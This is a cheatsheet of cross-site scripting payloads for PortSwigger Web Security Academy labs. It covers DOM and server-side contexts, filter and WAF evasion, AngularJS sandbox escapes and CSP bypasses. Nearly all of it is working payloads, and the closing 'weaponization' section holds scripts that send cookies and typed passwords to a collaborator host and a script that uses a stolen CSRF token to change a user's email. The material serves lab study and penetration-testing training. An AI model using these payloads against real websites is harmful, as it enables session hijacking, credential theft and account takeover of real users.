# ⚡ Cross-Site Scripting (XSS) Cheatsheet

Complete methodology, contexts, execution sinks, WAF bypasses, AngularJS sandbox escapes, and CSP bypass techniques for all XSS labs in PortSwigger Web Security Academy, split by DOM-based and Server-Side vectors.

---

## 🧩 Part 1: DOM-based XSS (Client-Side Sinks)

* **DOM XSS in document.write sink using source location.search:**
  - `"><svg onload=alert(1)>`

* **DOM XSS in document.write sink using source location.search inside a select element:**
  - Break out of `<select>` context: `"></select><img src=1 onerror=alert(1)>`

* **DOM XSS in innerHTML sink using source location.search:**
  - `"><img src=1 onerror=alert(1)>` or `"><svg onload=alert(1)>`

* **DOM XSS in jQuery anchor href attribute sink using location.search source:**
  - `javascript:alert(document.domain)`

* **DOM XSS in jQuery selector sink using a hashchange event:**
  - Leverage `$()` selector with `location.hash`: `<iframe src="https://target.com/#<img src=1 onerror=alert(1)>"></iframe>`

* **DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded:**
  - `{{$on.constructor('alert(1)')()}}`

* **Reflected DOM XSS:**
  - Break out of JSON string handling in client-side script: `\"-alert(1)}//`

* **Stored DOM XSS:**
  - Break out of dynamic `innerHTML` rendering from stored data: `<><img src=1 onerror=alert(1)>`

---

## 🖥️ Part 2: Server-Side XSS (Reflected & Stored)

### 1. Basic & Context Breakouts

* **Reflected XSS into HTML context with nothing encoded:**
  - `<script>alert(1)</script>`

* **Stored XSS into HTML context with nothing encoded:**
  - Inject `<script>alert(1)</script>` into persistent fields (e.g., comment section).

* **Reflected XSS into attribute with angle brackets HTML-encoded:**
  - `" autofocus onfocus=alert(1) x="`

* **Stored XSS into anchor href attribute with double quotes HTML-encoded:**
  - `javascript:alert(1)`

* **Reflected XSS in canonical link tag:**
  - Accesskey trigger on `<link rel="canonical">`: `?%27accesskey=%27x%27onclick=%27alert(1)` (Press `ALT+X` or `CTRL+ALT+X`).

* **Reflected XSS into a JavaScript string with single quote and backslash escaped:**
  - Close `<script>` tag directly: `</script><img src=1 onerror=alert(1)>`

* **Reflected XSS into a JavaScript string with angle brackets HTML encoded:**
  - Break out of string: `'-alert(1)-'` or `';alert(1)//`

* **Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quote escaped:**
  - Escape the escape character: `\';alert(1)//`

* **Reflected XSS in a JavaScript URL with some characters blocked:**
  - `javascript:fetch(String.fromCharCode(104,116,116,112,...))` or ES6 arrow functions: `javascript:x=>(alert(1))`

* **Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quote escaped:**
  - HTML entity encoding inside event handlers: `&apos;-alert(1)-&apos;`

* **Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks escaped:**
  - Expression expansion inside ES6 backticks: `${alert(1)}`

---

### 2. WAF Bypasses & Filter Evasion

* **Reflected XSS into HTML context with most tags and attributes blocked:**
  - Custom tags and event handlers via vector brute-force: `<body onresize=print()>` via `<iframe>` triggers.

* **Reflected XSS into HTML context with all tags blocked except custom ones:**
  - `<custom-tag id=x onfocus=alert(1) tabindex=1>#x`

* **Reflected XSS with event handlers and href attributes blocked:**
  - `<svg><a><animate attributeName=href values=javascript:alert(1) /><text>Click</text></a></svg>`

* **Reflected XSS with some SVG markup allowed:**
  - `<svg><animatetransform onbegin=alert(1)>`

* **Reflected XSS with AngularJS sandbox escape without strings:**
  - Execute functions using string generation from array methods: `1.toString().constructor.prototype...`

* **Reflected XSS with AngularJS sandbox escape and CSP:**
  - Combine Angular payload with `ng-app` directives and `window.name` override.

* **Reflected XSS protected by CSP, with CSP bypass:**
  - Bypass strict `script-src` policies by leveraging JSONP endpoints or path injection:
  - `<script src="https://target.com/api/jsonp?callback=alert(1)"></script>`

* **Reflected XSS protected by very strict CSP, with dangling markup attack:**
  - Inject unclosed tags to exfiltrate anti-CSRF tokens or sensitive DOM elements to an external listener:
  - `<img src='http://BURP-COLLABORATOR-SUBDOMAIN/?`

---

### 3. Exploitation & Weaponization

* **Exploiting cross-site scripting to steal cookies:**
  - `<script>fetch('https://BURP-COLLABORATOR-SUBDOMAIN/?cookie=' + document.cookie)</script>`

* **Exploiting cross-site scripting to capture passwords:**
  - Inject fake login form or auto-fill listener:
  - `<input type="text" name="username"><input type="password" name="password" onchange="fetch('http://COLLABORATOR/?u='+username.value+'&p='+this.value)">`

* **Exploiting XSS to bypass CSRF defenses:**
  - Fetch CSRF token via XSS and issue privileged POST request:
  - `<script>var token = document.getElementsByName('csrf')[0].value; fetch('/user/change-email', {method:'POST', body:'email=hacked@attacker.com&csrf='+token});</script>`
